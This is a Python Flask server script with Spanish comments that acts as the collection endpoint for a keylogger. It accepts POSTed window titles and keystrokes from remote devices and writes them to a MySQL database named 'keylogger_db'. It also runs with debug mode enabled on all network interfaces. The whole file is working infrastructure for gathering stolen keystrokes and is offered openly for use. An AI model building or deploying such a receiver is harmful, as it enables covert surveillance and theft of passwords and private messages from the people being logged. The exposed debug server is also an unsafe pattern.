from flask import Flask, request, jsonify
import pymysql
from flask_cors import CORS
import datetime

app = Flask(__name__)
CORS(app)  # Permite peticiones desde otros dominios (útil para pruebas)

# --- CONFIGURACIÓN DE LA BASE DE DATOS ---
# CAMBIA ESTOS VALORES por los de tu configuración de MySQL
DB_HOST = "localhost"
DB_USER = "root"
DB_PASSWORD = "TU_CONTRASEÑA_DE_MYSQL"
DB_NAME = "keylogger_db"

def get_db_connection():
    """Establece y devuelve una conexión a la base de datos."""
    connection = pymysql.connect(
        host=DB_HOST,
        user=DB_USER,
        password=DB_PASSWORD,
        database=DB_NAME,
        cursorclass=pymysql.cursors.DictCursor
    )
    return connection

@app.route('/log', methods=['POST'])
def receive_log():
    """Endpoint para recibir los datos del keylogger."""
    data = request.get_json()

    if not data or 'window_title' not in data or 'keystrokes' not in data:
        return jsonify({"status": "error", "message": "Faltan datos requeridos"}), 400

    window_title = data['window_title']
    keystrokes = data['keystrokes']

    connection = None
    try:
        connection = get_db_connection()
        with connection.cursor() as cursor:
            sql = "INSERT INTO logs (window_title, keystrokes) VALUES (%s, %s)"
            cursor.execute(sql, (window_title, keystrokes))
        connection.commit()
        return jsonify({"status": "success", "message": "Log guardado"}), 201
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        if connection:
            connection.close()

if __name__ == '__main__':
    # Escucha en todas las interfaces de red (0.0.0.0) para que sea accesible desde otros dispositivos
    app.run(host='0.0.0.0', port=5000, debug=True)